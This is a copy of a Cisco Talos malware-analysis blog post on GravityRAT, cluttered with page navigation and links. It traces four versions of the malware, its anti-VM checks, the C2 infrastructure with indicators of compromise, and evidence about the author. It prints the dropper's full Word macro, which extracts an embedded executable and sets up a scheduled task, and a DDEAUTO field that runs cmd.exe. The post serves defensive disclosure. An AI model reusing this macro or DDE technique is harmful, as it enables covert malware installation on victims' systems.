@@ -1,0 +1,924 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Cisco's Talos Intelligence Group Blog: GravityRAT - The Two-Year Evolution Of An APT Targeting India
+
+
+ Subscribe via Email
+
+T H U R S D AY,  A P R I L  2 6 ,  2 0 1 8
+
+This blog post is authored by Warren Mercer and Paul Rascagneres.
+
+GravityRAT - The Two-Year Evolution Of An APT
+Targeting India
+
+Search Blog
+
+S U B S C R I B E  T O  O U R  F E E D
+
+ Posts
+
+ Comments
+
+▼  2 0 1 8  (63)
+
+▼  A P R I L  (21)
+Threat Round Up for April 20-27
+
+GravityRAT - The Two-Year Evolution
+Of An APT Targ...
+
+Vulnerability Spotlight: Hyland
+Perceptive Documen...
+
+Cryptomining Campaign Returns
+Coal and Not Diamond...
+
+Beers with Talos EP27: Smart Install,
+Vuln Process...
+
+Vulnerability Spotlight: Multiple
+Issues in Foxit ...
+
+B L O G  A R C H I V E
+
+Software Vulnerability
+Information
+
+Reputation
+Center
+
+Library Support
+Communities
+
+About Careers Blog
+
+Convert webpages to pdf online with PDFmyURL
+
+http://www.talosintelligence.com/software
+http://www.talosintelligence.com/snort
+http://www.talosintelligence.com/clamav
+http://www.talosintelligence.com/razorback
+http://www.talosintelligence.com/daemon
+http://www.talosintelligence.com/moflow
+http://www.talosintelligence.com/pesig
+http://www.talosintelligence.com/immunet
+http://www.talosintelligence.com/teslacrypt_tool
+http://www.talosintelligence.com/mbrfilter
+http://www.talosintelligence.com/first
+http://www.talosintelligence.com/lockydump
+http://www.talosintelligence.com/freesentry
+http://www.talosintelligence.com/flokibot
+http://www.talosintelligence.com/scanner
+http://www.talosintelligence.com/smart_scanner
+http://www.talosintelligence.com/ropmemu
+http://www.talosintelligence.com/bass
+http://www.talosintelligence.com/pyrebox
+http://www.talosintelligence.com/file2pcap
+http://www.talosintelligence.com/decept
+http://www.talosintelligence.com/mutiny_fuzzer
+http://www.talosintelligence.com/vulnerability_info
+http://www.talosintelligence.com/vulnerability_reports
+http://www.talosintelligence.com/ms_advisories
+http://www.talosintelligence.com/reputation
+http://www.talosintelligence.com/reputation_center
+http://www.talosintelligence.com/amp-naming
+http://www.talosintelligence.com/documents/ip-blacklist
+http://www.talosintelligence.com/awbo_intro
+http://www.talosintelligence.com/resources
+http://www.talosintelligence.com/community
+https://snort.org/community
+https://www.clamav.net/contact.html#ml
+http://www.talosintelligence.com/aspis
+https://www.spamcop.net/
+http://www.talosintelligence.com/about
+http://www.talosintelligence.com/careers
+https://blog.talosintelligence.com/
+http://www.talosintelligence.com
+https://twitter.com/securitybeard
+https://twitter.com/r00tbsd
+https://blog.talosintelligence.com/feeds/posts/default
+https://blog.talosintelligence.com/feeds/6188594294975286687/comments/default
+http://www.talosintelligence.com/blog_subscription
+javascript:void(0)
+https://blog.talosintelligence.com/2018/
+javascript:void(0)
+https://blog.talosintelligence.com/2018/04/
+https://blog.talosintelligence.com/2018/04/threat-round-up-0420-0427.html
+https://blog.talosintelligence.com/2018/04/hyland-vulnerabilities-code-execution.html
+https://blog.talosintelligence.com/2018/04/cryptomining-campaign-returns-coal-not-diamond.html
+https://blog.talosintelligence.com/2018/04/beers-with-talos-ep27-smart-install.html
+https://blog.talosintelligence.com/2018/04/multiple-vulns-foxit-pdf-reader.html
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+Today, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for
+the past two years while it continues to be developed. Several weeks ago, we identified the use of
+the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical
+capabilities, the evolution, development and potential attribution of what we are calling GravityRAT. 
+
+GravityRAT has been under ongoing development for at least 18 months, during which the developer
+has implemented new features. We've seen file exfiltration, remote command execution capability
+and anti-vm techniques added throughout the life of GravityRAT. This consistent evolution beyond
+standard remote code execution is concerning because it shows determination and innovation by
+the actor. 
+
+Throughout our investigation, we observed several malicious documents used to attack victims,
+which we will discuss. These malicious documents were used by the developer to run several tests
+on the popular analysis platform VirusTotal. Using VirusTotal allowed the developer to make
+changes in an attempt to decrease antivirus detection.
+
+Although GravityRAT has not been previously published or discussed, there was some information
+from the National Computer Emergency Response Team (CERT) of India describing GravityRAT as
+being used in targeted attacks against India. Finally, we will discuss specific attribution elements
+discovered during our research into GravityRAT as we identify specific information, which we believe
+to be leaked by the developer, such as location, and potentially their first name.
+
+S U M M A R Y
+
+Updates for BASS
+
+Vulnerability Spotlight: Foscam IP
+Video Camera Fi...
+
+Threat Roundup for April 6 - 13
+
+Vulnerability Spotlight: Multiple
+Vulnerabilities ...
+
+Malware monitor - leveraging
+PyREBox for malware a...
+
+Vulnerability Spotlight: TALOS-2018-
+0529-531 - Mul...
+
+Vulnerability Spotlight: Multiple
+Simple DirectMed...
+
+Vulnerability Spotlight: Multiple
+Computerinsel Ph...
+
+Microsoft Patch Tuesday - April
+2018
+
+IcedID Banking Trojan Teams up
+with Ursnif/Dreambo...
+
+Beers with Talos EP26: Talos is
+Holding a Conferen...
+
+Critical Infrastructure at Risk:
+Advanced Actors T...
+
+Vulnerability Spotlight: Natus
+NeuroWorks Multiple...
+
+Vulnerability Spotlight: Moxa AWK-
+3131A Multiple F...
+
+Fake AV Investigation Unearths
+KevDroid, New Andro...
+
+►  M A R C H  (10)
+
+►  F E B R U A R Y  (14)
+
+►  J A N U A R Y  (18)
+
+►  2 0 1 7  (172)
+
+►  2 0 1 6  (98)
+
+►  2 0 1 5  (62)
+
+►  2 0 1 4  (67)
+
+►  2 0 1 3  (30)
+
+►  2 0 1 2  (53)
+
+Convert webpages to pdf online with PDFmyURL
+
+https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/s1600/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg
+https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory for Malicious Targeted Attack Campaign.pdf
+https://blog.talosintelligence.com/2018/04/updates-for-bass.html
+https://blog.talosintelligence.com/2018/04/foscam-unsigned-image-vuln.html
+https://blog.talosintelligence.com/2018/04/threat-round-up-0406-0413.html
+https://blog.talosintelligence.com/2018/04/vuln-moxa-edr-810.html
+https://blog.talosintelligence.com/2018/04/malware-monitor-pyrebox-for-analysis.html
+https://blog.talosintelligence.com/2018/04/vulnerability-spotlight-talos-2018-0529-531.html
+https://blog.talosintelligence.com/2018/04/simple-direct-media-layer-vulnerabilities.html
+https://blog.talosintelligence.com/2018/04/PhotoLine-PSD-Code-Execution.html
+https://blog.talosintelligence.com/2018/04/ms-tuesday.html
+https://blog.talosintelligence.com/2018/04/icedid-banking-trojan.html
+https://blog.talosintelligence.com/2018/04/beers-with-talos-ep26-talos-is-holding.html
+https://blog.talosintelligence.com/2018/04/critical-infrastructure-at-risk.html
+https://blog.talosintelligence.com/2018/04/vulnerability-spotlight-natus.html
+https://blog.talosintelligence.com/2018/04/vulnerability-spotlight-moxa-awk-3131a.html
+https://blog.talosintelligence.com/2018/04/fake-av-investigation-unearths-kevdroid.html
+javascript:void(0)
+https://blog.talosintelligence.com/2018/03/
+javascript:void(0)
+https://blog.talosintelligence.com/2018/02/
+javascript:void(0)
+https://blog.talosintelligence.com/2018/01/
+javascript:void(0)
+https://blog.talosintelligence.com/2017/
+javascript:void(0)
+https://blog.talosintelligence.com/2016/
+javascript:void(0)
+https://blog.talosintelligence.com/2015/
+javascript:void(0)
+https://blog.talosintelligence.com/2014/
+javascript:void(0)
+https://blog.talosintelligence.com/2013/
+javascript:void(0)
+https://blog.talosintelligence.com/2012/
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+The majority of the malicious documents crafted by the malware author are Microsoft Office Word
+documents. The attacker uses an embedded macro in order to execute malicious code on the
+victim's system. The document opens and appears as such:
+
+The document asks to the user to enable macros in order to prove that the user is not a robot
+(similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that a lot of
+
+INFE C TIO N V E C TO R S
+
+Malicious Office Documents
+
+►  2 0 1 1  (23)
+
+►  2 0 1 0  (93)
+
+►  2 0 0 9  (146)
+
+►  2 0 0 8  (37)
+
+R E C O M M E N D E D  B L O G S
+
+C I S C O  B L O G
+Talos Threat Round Up for April 20-27
+
+C L A M A V ®  B L O G
+ClamAV 0.100.0 has been released!
+
+S N O R T  B L O G
+Snort Subscriber Rule Set Update for
+01/16/2018
+
+Convert webpages to pdf online with PDFmyURL
+
+https://2.bp.blogspot.com/-dQ1PBhfakzE/Wt7LjOGzQiI/AAAAAAAAAXI/PI9n38agywU4HpIa7IjnDSvbhLMYy83ugCLcBGAs/s1600/image4.png
+javascript:void(0)
+https://blog.talosintelligence.com/2011/
+javascript:void(0)
+https://blog.talosintelligence.com/2010/
+javascript:void(0)
+https://blog.talosintelligence.com/2009/
+javascript:void(0)
+https://blog.talosintelligence.com/2008/
+https://blogs.cisco.com
+https://blogs.cisco.com/security/talos/talos-threat-round-up-for-april-20-27
+http://blog.clamav.net/
+https://feedproxy.google.com/~r/Clamav/~3/takVpuywnTk/clamav-01000-has-been-released.html
+http://blog.snort.org/
+http://blog.snort.org/2018/01/snort-subscriber-rule-set-update-for_16.html
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+(similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that a lot of
+Office-based malware uses. It is an attempt to trick any users who are using Protected Mode on
+their systems. By enabling macros, the malware is able to begin it's execution. We discovered that
+the embedded macro is quite small when extracted.
+
+Sub AutoOpen()
+  If Not Dir(Environ("TEMP") + "\image4.exe") <> "" Then
+    Const lCancelled_c As Long = 0
+      Dim sSaveAsPath As String
+      sSaveAsPath = 
+CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + 
+"\temporary.zip"
+      If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub
+      ActiveDocument.Save
+      Application.Documents.Add ActiveDocument.FullName
+      ActiveDocument.SaveAs sSaveAsPath
+      ActiveDocument.Close
+      Set app = CreateObject("Shell.Application")
+      ExtractTo = 
+CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
+      ExtractByExtension app.NameSpace(Environ("TEMP") + "\temporary.zip"), 
+"exe", ExtractTo
+  End If
+End Sub
+
+Sub ExtractByExtension(fldr, ext, dst)
+  Set FSO = CreateObject("Scripting.FileSystemObject")
+  Set app = CreateObject("Shell.Application")
+  For Each f In fldr.Items
+    If f.Type = "File folder" Then
+      ExtractByExtension f.GetFolder, ext, dst
+    ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then
+      If Not Dir(Environ("TEMP") + "\image4.exe") <> "" Then
+        app.NameSpace(dst).CopyHere f.Path, &H4
+      End If
+    End If
+  NextConvert webpages to pdf online with PDFmyURL
+
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+  Next
+  Shell "schtasks /create /tn wordtest /tr ""'%temp%\image4.exe' 35"" /sc 
+DAILY /f /RI 10 /du 24:00 /st 00:01"
+End Sub
+
+This macro contains three functions: 
+
+The first one is executed when the document is opened. The purpose is to copy the
+active document (the opened Word document) in a temporary directory and to rename it
+as a ZIP archive. Indeed, the docx format is, in fact, a common ZIP archive, and can be
+unzipped using common tools.
+
+The second function decompresses this 'temporary.zip' file and extracts the .exe file
+stored in it.
+
+The third creates a scheduled task, named 'wordtest', to execute this malicious file
+every day.
+
+With this approach, the attacker ensures that there is no direct execution (the executable is
+executed thanks to scheduled tasks), there's no download of an additional payload, and finally, the
+author uses the fact that the docx format is an archive in order to include its executable
+(GravityRAT).
+
+During our tracking, we identified several malicious documents submitted from this actor on
+VirusTotal for testing purposes. They tested the detection on macros (by modifying them, or by
+executing the calc instead of the malicious payload) and the developers tried dynamic data
+exchange (DDE) execution in the Office document. This is abusing the DDE protocol which exists
+within Microsoft Office documents. Whilst this is a feature Microsoft provide it is also a feature that
+an attacker can leverage for malicious activity, Microsoft published mitigation information here
+previously. The developer crafted Office Word and Excel documents to see the detection in
+VirusTotal. The authors tried to hide the DDE object in a different part of the document — in the
+main object and the header, for example. The DDE object simply executes Microsoft calc in the
+detected sample. Here is an example:
+
+Testing By The Author
+
+Convert webpages to pdf online with PDFmyURL
+
+https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+
+<w:document [...redated...}] mc:Ignorable="w14 w15 wp14"><w:body><w:p 
+w:rsidR="00215C91" w:rsidRDefault="008C166A"><w:r><w:fldChar 
+w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> 
+</w:instrText></w:r><w:r><w:rPr><w:rFonts w:ascii="Helvetica" 
+w:hAnsi="Helvetica" w:cs="Helvetica"/><w:color w:val="383838"/><w:spacing 
+w:val="3"/><w:sz w:val="26"/><w:szCs w:val="26"/><w:shd w:val="clear" 
+w:color="auto" w:fill="FFFFFF"/></w:rPr><w:instrText>DDEAUTO 
+c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r><w:r>
+<w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar 
+w:fldCharType="end"/></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/>
+<w:bookmarkEnd w:id="0"/></w:p><w:sectPr w:rsidR="00215C91"><w:pgSz 
+w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" 
+w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
+<w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body>
+</w:document>
+
+We believe the filenames of the submitted samples are clearly testing docs, using different
+methods and Office tricks to attempt to ensure his malware was undetected. Those names were:
+
+testnew1.docx
+Test123.docx
+test456.docx
+test2.docx
+book1test2.xlsx
+Test123.doc
+
+Our initial discovery of GravityRAT was through a malicious Word document. As explained
+
+G R AV ITY R AT
+
+Convert webpages to pdf online with PDFmyURL
+
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+previously, this Word document had various macros to deliver a final payload.Considering that this
+was the most recent version of the malware, we decided to ascertain how long this actor had been
+active, and how their attacks had evolved. We were able to discover four distinct versions of
+GravityRAT, developed over two years. Next, we will go through what we believe is the development
+life cycle and feature-addition mission carried out by this developer.
+
+The malware author uses a versioning system starting by the G letter. The oldest version we
+identified is G1. Here is the PDB path of the sample:
+
+f:\F\Windows Work\G1\Adeel's Laptop\G1 Main 
+Virus\systemInterrupts\gravity\obj\x86\Debug\systemInterrupts.pdb
+
+You can notice the potential first name of the developers: Adeel. Of course, this information can be
+manipulated by the malware author. This sample was compiled in December 2016. The original
+filename of the sample was resume.exe.
+
+The purpose of this version was to steal information on the compromised system:
+
+MAC Address
+Computer name
+Username
+IP address
+Date
+Steal files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf and .pdf
+The volumes mapped on the system
+
+All this information was then sent to one of the following domains:
+
+Version G1
+
+Convert webpages to pdf online with PDFmyURL
+
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+G1 also had the ability to execute commands remotely on the infected host machine at the author's
+will.
+
+We identified a new variant used in July 2017 named G2. Here is the PDB of the sample:
+
+e:\Windows Work\G2\G2 Main Virus\Microsoft Virus Solutions (G2 v5) 
+(Current)\Microsoft Virus Solutions\obj\Debug\Windows Wireless 802.11.pdb
+
+For this version, the developer modified the architecture of the malware. The main code aims to
+load and execute two additional .NET binaries stored in the resources of the file:
+
+The first resource is a legitimate open-source library available on GitHub. It's a .NET
+wrapper for the Windows Task Scheduler
+The second is the G2 version of GravityRAT
+
+This variant shares the same command and control (C2) servers as G1, however, we have an
+additional 'payload' variable added to G2.
+
+Version G2
+
+Convert webpages to pdf online with PDFmyURL
+
+https://3.bp.blogspot.com/-UcHtAEOU3h0/Wt7LxSthMbI/AAAAAAAAAXM/h3Z-qsaR8o0zn2Z4w3WL6wTuA69fN1pigCLcBGAs/s1600/image13.png
+https://github.com/dahall/TaskScheduler
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+This variant has almost identical capabilities as the previous, except one additional functionality: It
+collects the CPU information in the Win32_Processor entry via WMI request (Processor ID, Name,
+Manufacturer and the clock speed). The attacker is most likely using this information as part of an
+anti-vm attempt within this malware. This is used to try and thwart analysis in virtual environments.
+
+In a slight change to the previous variant, the new payloads are executed with a Windows Scheduled
+Task. This would explain the inclusion of the .NET wrapper.
+
+The analysed sample contained a decoy picture document in the resource section:
+
+Convert webpages to pdf online with PDFmyURL
+
+https://4.bp.blogspot.com/-vxszBdqixjI/Wt7L3rW-XgI/AAAAAAAAAXU/8RDRoFQ-LQMW9pwhjeCGNEBTQOK5KoI0gCLcBGAs/s1600/image11.png
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+In August 2017, the author of GravityRAT used a new variant of its malware, G3. Here is the PDB:
+
+F:\Projects\g3\G3 Version 4.0\G3\G3\obj\Release\Intel Core.pdb
+
+This variant uses the same method as G2, and includes a legitimate library in the resource section.
+The developers also added additional language support to the library:
+
+German
+Spanish
+French
+Italian
+Chinese
+
+Version G3
+
+Convert webpages to pdf online with PDFmyURL
+
+https://3.bp.blogspot.com/-_c2bthVW74M/Wt7L9esEUBI/AAAAAAAAAXY/Q08XG-usdkk0x0-7gNXacU-IiGmY4WD-gCLcBGAs/s1600/image14.jpg
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+The author changed the backend of the C2 server with this variant. The URI changed too, it contains
+the GravityRAT variant name:
+
+August was also the same month the Indian CERT notified potential victims that GravityRAT had
+been used in a targeted campaign. Given the ongoing development nature of this malware, it meant
+another variant was most likely due.
+
+The latest version of GravityRAT was created in December 2017 named GX. Here is the PDB:
+
+C:\Users\The Invincible\Desktop\gx\gx-current-
+program\LSASS\obj\Release\LSASS.pdb
+
+This version is the most advanced variant of GravityRAT. Throughout the evolution, we saw this
+malware embedding open-source legitimate .NET libraries (for schedule tasks, compression,
+
+Version GX
+
+Convert webpages to pdf online with PDFmyURL
+
+https://3.bp.blogspot.com/-Eu6_hxb07dg/Wt7MFLv_JHI/AAAAAAAAAXg/0oUTL3M6Z90piQX55oUTJwqo5kNj5QMqQCLcBGAs/s1600/image16.png
+https://1.bp.blogspot.com/-PTtQK0yUxyI/Wt7MLUjT11I/AAAAAAAAAXk/2O4wnfCkU1QB73cEDvEeJgBihOOFT533ACLcBGAs/s1600/image6.png
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+malware embedding open-source legitimate .NET libraries (for schedule tasks, compression,
+encryption, .NET loading). It contains a resource named "important." This is an archive with a
+password.
+
+This variant has the same features as before, but this time, some new features are added:
+
+It collects open ports on the victim host by running the netstat command
+It lists all the running processes
+It lists available services on the system
+It exfiltrates .ppt and .pptx file, in addition to the extension mentioned in the G1 variant
+If a USB key is connected on the system, the malware steals the file based on an
+extension list
+It supports file encryption (AES with the key "lolomycin2017")
+It collects information on the account (account type, description, domain name, full
+name, SID and status)
+It checks if the system is a virtual machine with several techniques
+
+The developer implemented a total of seven techniques to identify if the compromised system is a
+virtual machine.
+
+The first technique consists of looking at any additional tools used by the hypervisor that are
+installed on the system (by checking a registry key):
+
+The second technique uses a WMI request to the BIOS version (Win32_BIOS entry). If the response
+contains: "VMware", "Virtual", "XEN", "Xen" or "A M I" the system is considered as a virtual machine.
+Additionally, the malware checks the SerialNumber and the version of the BIOS.
+
+Convert webpages to pdf online with PDFmyURL
+
+https://1.bp.blogspot.com/-sfrVtRiOK9Q/Wt7MR1S3QjI/AAAAAAAAAXs/RhwXts3IMcoqu6yWifrss8EAYoAPEJoiACLcBGAs/s1600/image10.png
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+The third technique uses the Win32_Computer entry in WMI. It checks if the manufacturer contains
+"VIRTUAL", "VMWARE" or "VirtualBox".
+
+The fourth technique checks the Processor ID of the system.
+
+The fifth technique counts the number of cores in the infected system (the author expects more
+than one core)
+
+Convert webpages to pdf online with PDFmyURL
+
+https://4.bp.blogspot.com/-RHN_i1EGAkw/Wt7Mb5NhnXI/AAAAAAAAAX0/cuEBsYTBZTExwsIqyjIofDN9AHmFuweTwCLcBGAs/s1600/image5.png
+https://2.bp.blogspot.com/-_bZLneKsNUQ/Wt7MhjEWrMI/AAAAAAAAAX8/jABBWa-hl58U6j0Wg703RBXWeZx4kRKFQCLcBGAs/s1600/image8.png
+https://1.bp.blogspot.com/-mS_Iu7onLK8/Wt7MmiSTQFI/AAAAAAAAAYA/Gud1lq9dLokn83EnajpcOtOy4MQt2BPgQCLcBGAs/s1600/image12.png
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+The sixth technique checks the current CPU temperature of the system (the
+MSAcpi_ThermalZoneTemperature entry). Indeed, some hypervisors (VMWare, VirtualBox and
+Hyper-V) do not support temperature check. The WMI request simply replies "not supported". This
+behaviour can be used to detect if the targeted system is a real machine.
+
+The last technique uses the MAC Address of the infected system. If the MAC Address starts by a
+well-known hexadecimal number, the system is identified as a virtual machine.
+
+The C2 servers communication is performed in HTTP as it did previously. The variant version of GX
+is used in the URI. The C2 servers we can see are shared with the previous variants:
+
+Convert webpages to pdf online with PDFmyURL
+
+https://4.bp.blogspot.com/-Zt5D7x7XDyg/Wt7Ms97CSLI/AAAAAAAAAYE/leAGaijJe5sl3yIhY4p2CiF2K8wkNWbHwCLcBGAs/s1600/image9.png
+https://2.bp.blogspot.com/-lyyUYEU8QMc/Wt7MyhgiXZI/AAAAAAAAAYM/ZnRY4H8SgfEu0ozJngwLhx48VEYeRBuzQCLcBGAs/s1600/image7.png
+https://1.bp.blogspot.com/-AG6M5oChPus/Wt7M2wcMVyI/AAAAAAAAAYU/NtT04MdbZmYit7d7wBZPVZZYfBiBsPNBwCLcBGAs/s1600/image15.png
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+Below, we will present evidence that we have obtained regarding the attacker and the associated
+malware. Obviously, attribution is a complex field. The developers could be using a proxy or a VPN in
+order to fake the origin of the submission. But, we will still simply present some facts concerning
+this actor. 
+
+The developer used at least two different usernames in the past two years: "The Invincible" and
+"TheMartian." In the oldest version of GravityRAT, the attacker potentially leaked his or her first
+name in the PDB: "Adeel" — the path contained "Adeel's Laptop". Additionally, all the malicious Office
+documents, and more specifically the documents used to test anti-virus on VirusTotal, were
+submitted from Pakistan. One of the four PE files in the IOCs section was sent from Pakistan, too.
+
+In August 2017, the Indian National CERT published an advisory about malicious targeted
+campaigns. This advisory mentions the C2 server infrastructure of GravityRAT, which means the
+GravityRAT author likely targeted Indian entities/organisations. By leveraging Cisco Umbrella and
+using the Investigate tool, we were able to determine that across all of the C2 domains listed, we
+saw a large influx of traffic originating from India, as evidenced by the National CERT, all of the C2
+domains were at least 50 percent requested by Indian IP infrastructure. It is possible that some of
+the non-Indian IP space requests may artefacts be due to our own research. 
+
+W H AT W E  KNO W  A B O U T TH E  A U TH O R
+
+Convert webpages to pdf online with PDFmyURL
+
+https://2.bp.blogspot.com/-bS3NywC79sg/Wt7M98eaciI/AAAAAAAAAYc/a7RaSeWNRNwNx8eGavpn8-Bk94SCc4vRQCLcBGAs/s1600/image1.png
+https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory for Malicious Targeted Attack Campaign.pdf
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+This actor is probably not the most advanced actor we've seen. But he or she managed to stay
+under the radar since 2016. They worked on malicious code, and produced four variants. Each new
+variant included new features. The developer used the same C2 infrastructure all this time. The
+developer was clever enough to keep this infrastructure safe, and not have it blacklisted by a
+security vendor. The actor took their time to ensure they were not within a virtual environment to
+avoid analysis. However, they did not take any time at all to attempt to obfuscate their .NET code.
+The code was largely trivial to reverse engineer, which meant static analysis was an easy option for
+this piece of malware.
+
+The Indian CERT published an advisory about this actor, which suggest they targeted Indian entities
+and organizations.
+
+The author leaked information within the samples (i.e. Adeel) and on the VirusTotal platform.
+Thanks to this information, we we able to understand how they tested malicious documents in order
+to decrease detection ratios across many popular engines. During this testing period, all the
+samples were uploaded from Pakistan to VirusTotal. 
+
+C O NC L U S IO N
+
+C O V E R A G E
+
+Convert webpages to pdf online with PDFmyURL
+
+https://4.bp.blogspot.com/-xsP6ao_8HoI/Wt7NIpkvteI/AAAAAAAAAYk/CLLFsL828_AzDbFbfaMyh_dbDiOpho4IgCLcBGAs/s1600/image3.png
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+Additional ways our customers can detect and block this threat are listed below.
+
+Advanced Malware Protection (AMP) is ideally
+suited to prevent the execution of the malware
+used by these threat actors.
+
+CWS or WSA web scanning prevents access to
+malicious websites and detects malware used
+in these attacks.
+
+Email Security can block malicious emails sent
+by threat actors as part of their campaign.
+
+Network Security appliances such as NGFW,
+NGIPS, and Meraki MX can detect malicious
+activity associated with this threat.
+
+AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security
+products.
+
+Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains,
+IPs, and URLs, whether users are on or off the corporate network.
+
+Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest
+rule pack available for purchase on Snort.org.
+
+IO C S
+
+Malicious Documents
+
+MACROS
+
+Convert webpages to pdf online with PDFmyURL
+
+https://4.bp.blogspot.com/-87wNIQB7f5M/Wt7NP7q96AI/AAAAAAAAAYs/Jx_ypOoamac3cc0yNNtUqO6JWmo5CP10QCLcBGAs/s1600/image2.png
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/advanced-malware-protection&sa=D&ust=1524553763505000
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html&sa=D&ust=1524553763506000
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html&sa=D&ust=1524553763506000
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html&sa=D&ust=1524553763507000
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/firewalls/index.html&sa=D&ust=1524553763508000
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/firewalls/index.html&sa=D&ust=1524553763508000
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html&sa=D&ust=1524553763508000
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html&sa=D&ust=1524553763508000
+https://www.google.com/url?q=https://meraki.cisco.com/products/appliances&sa=D&ust=1524553763509000
+https://www.google.com/url?q=https://meraki.cisco.com/products/appliances&sa=D&ust=1524553763509000
+https://www.google.com/url?q=https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html&sa=D&ust=1524553763509000
+https://www.google.com/url?q=https://umbrella.cisco.com/&sa=D&ust=1524553763510000
+https://www.google.com/url?q=https://www.snort.org/products&sa=D&ust=1524553763510000
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb703
+70dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82
+835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4
+C14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719
+ed0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2a
+f4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136
+
+911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024f
+fb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210
+ef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301
+cd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a2
+07682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105
+
+9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3a
+
+1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bc
+
+99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90
+
+1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96
+
+hxxp://cone[.]msoftupdates.com:46769
+hxxp://ctwo[.]msoftupdates.com:46769
+hxxp://cthree[.]msoftupdates.com:46769
+hxxp://eone[.]msoftupdates.eu:46769
+hxxp://etwo[.]msoftupdates.eu:46769
+hxxp://msupdates[.]mylogisoft.com:46769
+hxxp://coreupdate[.]msoftupdates.com:46769
+hxxp://updateserver[.]msoftupdates.eu:46769
+
+OTHER MALICIOUS DOCUMENTS (DDE)
+
+GravityRAT
+G1
+
+G2
+
+G3
+
+GX
+
+C2 Servers
+
+Convert webpages to pdf online with PDFmyURL
+
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+S H A R E  T H I S
+
+P O S T
+
+hxxp://updateserver[.]msoftupdates.eu:46769
+
+msoftupdates[.]com
+msoftupdates[.]eu
+mylogisoft[.]com
+
+URI:
+/Gvty@/1ns3rt_39291384.php
+/Gvty@/newIns3rt.php
+/Gvty@/payloads
+/Gvty@/ip.php
